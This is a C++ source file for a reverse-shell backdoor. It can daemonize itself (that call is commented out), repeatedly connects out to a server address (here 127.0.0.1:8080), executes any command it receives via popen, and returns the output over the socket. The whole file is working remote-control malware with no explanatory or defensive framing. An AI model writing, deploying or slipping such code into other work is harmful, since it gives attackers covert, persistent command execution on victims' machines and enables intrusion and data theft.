#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <iostream>
#include <cstdlib>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <cstdio>
#include <string>
#include <cstring>

void deamonize(){
    pid_t pid = fork();
    if(pid < 0) exit(1);
    if(pid > 0) exit(0);

    if(setsid() < 0) exit(1);
    
    pid = fork();
    if(pid < 0) exit(1);
    if(pid > 0) exit(0);

    umask(0);
    if(chdir("/") < 0) exit(1);

    int fd = open("/dev/null", O_RDWR);
    if(fd >= 0) {
        dup2(fd, STDIN_FILENO);
        dup2(fd, STDOUT_FILENO);
        dup2(fd, STDERR_FILENO);
        if(fd > 2) close(fd);
    }
}

int establish_connection(const char* ip, int port){
    while(true) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            sleep(10);
            continue;
        }

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;      
        addr.sin_port = htons(port);

        if(inet_pton(AF_INET, ip, &addr.sin_addr) <= 0){
            close(sock);
            sleep(10);
            continue;
        }
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0){
            std::cerr << "Connection error" << std::endl;
            close(sock);
            sleep(5);
            continue;
        } else {
            return sock;
        }
    }
}

void handle_server_commands(int sock){
    while (true) {
        char buffer[1024] = {0};
        
        ssize_t received_bytes = recv(sock, buffer, sizeof(buffer) - 1, 0); 
        
        if (received_bytes <= 0) {
            std::cerr << "Server disconnected" << std::endl;
            close(sock);
            return; 
        }
           
        buffer[received_bytes] = '\0';

        while (received_bytes > 0 && (buffer[received_bytes - 1] == '\n' || buffer[received_bytes - 1] == '\r')) {
            buffer[received_bytes - 1] = '\0';
            received_bytes--;
        }

        if(received_bytes == 0) continue;

        if (strcmp(buffer, "exit") == 0) {
            close(sock);
            exit(0);
        }

        std::string response = "";
        FILE* pipe = popen(buffer, "r");
        
        if(!pipe) {
            response = "Failed to execute command \n";
        } else {
            char tmp_buffer[256];
            while(fgets(tmp_buffer, sizeof(tmp_buffer), pipe) != NULL) {
                response += tmp_buffer;
            }
            pclose(pipe);
        }

        if (response.empty()) { 
            response = "Command executed \n";
        }

        send(sock, response.c_str(), response.length(), 0);
    }
}

int main() {
    // deamonize();

    const char* server_ip = "127.0.0.1";
    int server_port = 8080;

    while(true) {
        int active_socket = establish_connection(server_ip, server_port);
        std::cout << "Connected to server" << std::endl;
        handle_server_commands(active_socket);
    }
    return 0;
}